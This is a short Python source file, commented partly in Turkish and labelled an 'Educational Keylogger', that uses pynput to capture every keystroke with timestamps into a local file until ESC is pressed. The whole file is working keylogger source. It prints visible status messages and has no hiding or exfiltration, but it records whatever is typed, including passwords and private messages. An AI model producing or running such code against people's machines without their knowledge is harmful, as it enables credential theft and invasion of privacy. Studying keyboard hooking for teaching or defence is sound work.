import logging
from pynput.keyboard import Key, Listener

# -----------------------------------------------------------
# PROJECT: Educational Keylogger
# DEVELOPER: [Senin Adın]
# DESCRIPTION: Demonstrates keyboard hooking mechanism using Python.
# NOTE: This project is for educational purposes only.
# -----------------------------------------------------------

# Log dosyasının kaydedileceği yer ve format ayarları
log_file = "key_log.txt"

logging.basicConfig(
    filename=log_file,
    level=logging.DEBUG,
    format='%(asctime)s: %(message)s'
)

print("[-] Keylogger Started. Listening for input...")
print("[-] Press 'ESC' to stop the logging session.")

def on_press(key):
    """
    Callback function triggered on key press event.
    Logs standard characters and special keys differently.
    """
    try:
        # Standart karakterleri (a, b, 1, 2) logla
        logging.info(str(key.char))
    except AttributeError:
        # Özel tuşları (Space, Enter, Shift vb.) işle
        if key == Key.space:
            logging.info(" [SPACE] ")
        elif key == Key.enter:
            logging.info(" [ENTER] \n")
        else:
            logging.info(f" {str(key)} ")

def on_release(key):
    """
    Callback function triggered on key release.
    Stops the listener loop if ESC is pressed.
    """
    if key == Key.esc:
        print("[-] Stopping Keylogger...")
        print(f"[-] Logs saved to: {log_file}")
        # False döndürmek Listener thread'ini sonlandırır
        return False

# Listener thread'ini başlat
if __name__ == "__main__":
    with Listener(on_press=on_press, on_release=on_release) as listener:
        listener.join()